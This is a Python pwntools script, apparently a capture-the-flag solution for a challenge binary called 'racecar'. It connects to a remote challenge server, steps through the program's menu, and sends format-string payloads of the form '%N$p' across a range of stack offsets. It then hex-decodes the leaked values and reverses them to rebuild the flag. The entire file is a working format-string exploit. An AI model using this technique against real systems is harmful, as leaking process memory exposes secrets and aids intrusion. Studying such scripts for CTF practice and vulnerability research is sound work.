from pwn import *

# =========================================================
#                          SETUP                         
# =========================================================
exe = './racecar'
elf = context.binary = ELF(exe, checksec=False)
context.log_level = 'warning'
host, port = '188.166.175.58', 31360


# =========================================================
#                           FUZZ
# =========================================================

def setup():
    io.sendlineafter(b'Name:', b'asw')
    io.sendlineafter(b'Nickname:', b'asw')
    
    for i in range(2):
        io.sendlineafter(b'>', b'2')

    io.sendlineafter(b'>', b'1')
    return
flag = ''
for i in range(12, 25): # Range is obtained by fuzzing locally, fine tuned to only get the flag
    try:
        global io
        io = remote(host, port)
        # io = process()
        setup()

        # start fuzzing
        io.sendlineafter(b'> ', f'%{i}$p'.encode())
        io.recvlines(2)
        leak = io.recv()

        if not b'(nil)' in leak:
            print(f'stack at-{i}' + ": " + str(leak))
            try:
                hexform = unhex(leak.split()[0][2:].decode())
                flag += hexform.decode()[::-1]
                print("flag appended")
            except BaseException:
                pass
        io.close()
    except EOFError:
        io.close()

# Print flag
print(f'{flag=}')
